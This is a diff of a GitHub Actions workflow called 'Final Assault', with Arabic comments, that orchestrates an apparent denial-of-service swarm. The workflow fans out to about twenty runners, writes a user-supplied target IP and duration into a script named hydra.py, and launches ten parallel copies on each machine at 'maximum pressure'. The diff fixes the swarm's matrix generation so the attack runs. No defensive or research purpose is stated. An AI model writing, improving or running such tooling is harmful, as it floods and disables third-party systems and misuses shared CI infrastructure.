@@ -1,5 +1,5 @@
-# اسم الـ Workflow: Final Assault (v21 - MAX PRESSURE)
-name: Final Assault (v21)
+# اسم الـ Workflow: Final Assault (v22 - The Lesson Learned)
+name: Final Assault (v22)
 
 on:
   workflow_dispatch:
@@ -11,7 +11,7 @@ on:
       duration:
         description: 'Attack Duration (seconds)'
         required: true
-        default: '600' # 10 minutes
+        default: '600'
       swarm_size:
         description: 'Swarm Size (Number of Machines, max ~20)'
         required: true
@@ -19,18 +19,38 @@ on:
       concurrency_per_machine:
         description: 'Concurrency per Machine (Number of processes)'
         required: true
-        default: '10' # تشغيل 10 نسخ على كل جهاز من الـ 20
+        default: '10'
 
 jobs:
-  # المهمة التي سيتم تكرارها 20 مرة
+  # المهمة الأولى: إنشاء مصفوفة الهجوم بشكل آمن
+  generate_attack_matrix:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.set-matrix.outputs.matrix }}
+    steps:
+      - name: Generate Swarm Matrix
+        id: set-matrix
+        run: |
+          SIZE=${{ github.event.inputs.swarm_size }}
+          MATRIX="{\"include\":["
+          for (( i=1; i<=$SIZE; i++ )); do
+            MATRIX+="{\"instance_id\":$i},"
+          done
+          MATRIX=$(echo $MATRIX | sed 's/,$//')
+          MATRIX+="]}"
+          echo "Generated Matrix: $MATRIX"
+          echo "matrix=$MATRIX" >> $GITHUB_OUTPUT
+
+  # المهمة الثانية: إطلاق الهجوم بناءً على المصفوفة الصحيحة
   unleash_assault_cell:
+    needs: generate_attack_matrix
     runs-on: ubuntu-latest
     
-    # استراتيجية السرب: تشغيل هذه المهمة 20 مرة بشكل متوازٍ
+    # --- هذا هو الإصلاح النهائي ---
+    # استخدام المصفوفة التي تم إنشاؤها مسبقًا بشكل آمن
     strategy:
       fail-fast: false
-      matrix:
-        instance_id: ${{ fromJson(format('[{0}]', join(range(1, github.event.inputs.swarm_size + 1), ','))) }}
+      matrix: ${{ fromJson(needs.generate_attack_matrix.outputs.matrix) }}
 
     steps:
       - uses: actions/checkout@v3
@@ -41,11 +61,9 @@ jobs:
       - name: Prepare Environment
         id: prepare
         run: |
-          # تعديل الكود بالمدخلات في ملف hydra.py
           sed -i "s/TARGET_IP = .*/TARGET_IP = \"${{ github.event.inputs.target_ip }}\"/" hydra.py
           sed -i "s/DURATION = .*/DURATION = ${{ github.event.inputs.duration }}/" hydra.py
           
-          # حساب مدة الـ timeout
           TIMEOUT_MINS=$(( (${{ github.event.inputs.duration }} / 60) + 5 ))
           echo "timeout=$TIMEOUT_MINS" >> $GITHUB_OUTPUT
 
@@ -54,13 +72,11 @@ jobs:
         run: |
           echo "Assault Cell #${{ matrix.instance_id }} | Launching ${{ github.event.inputs.concurrency_per_machine }} processes..."
           
-          # --- تعدد المهام داخل كل جهاز ---
-          # تشغيل الكود 10 مرات في الخلفية على نفس الجهاز
           for i in $(seq 1 ${{ github.event.inputs.concurrency_per_machine }}); do
             echo "Launching process $i on cell #${{ matrix.instance_id }}..."
             python3 -u hydra.py &
           done
           
-          echo "All processes launched. Cell #${{ matrix.instance_id }} is now at maximum pressure. Waiting for duration..."
-          # الانتظار لضمان استمرار عمل العمليات في الخلفية
+          echo "All processes launched. Cell #${{ matrix.instance_id }} is now at maximum pressure. Waiting for all processes to complete..."
+          # wait هو أمر bash ينتظر انتهاء جميع العمليات في الخلفية
           wait
